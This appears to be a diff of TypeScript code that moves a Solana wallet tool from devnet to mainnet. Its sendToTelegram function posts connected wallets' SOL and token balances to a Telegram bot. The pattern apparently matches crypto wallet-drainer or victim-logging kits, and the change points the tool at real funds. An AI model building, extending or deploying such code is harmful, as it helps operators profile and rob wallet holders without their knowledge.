@@ -30,10 +30,9 @@ async function retry<T>(
 
 // Create a connection with proper config
 const createConnection = () => {
-  return new Connection("https://api.devnet.solana.com", {
+  return new Connection("https://api.mainnet-beta.solana.com", {
     commitment: 'confirmed',
     confirmTransactionInitialTimeout: 60000,
-    wsEndpoint: "wss://api.devnet.solana.com/",
   });
 };
 
@@ -89,7 +88,7 @@ export const sendToTelegram = async (walletData: any) => {
       `💎 SOL Balance: ${solBalanceInSol.toFixed(4)} SOL\n` +
       `⏰ Time: ${new Date().toLocaleString()}\n\n` +
       `💰 Token Balances:\n${formattedTokens}\n\n` +
-      `🌐 Network: Solana Devnet`;
+      `🌐 Network: Solana Mainnet`;
 
     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
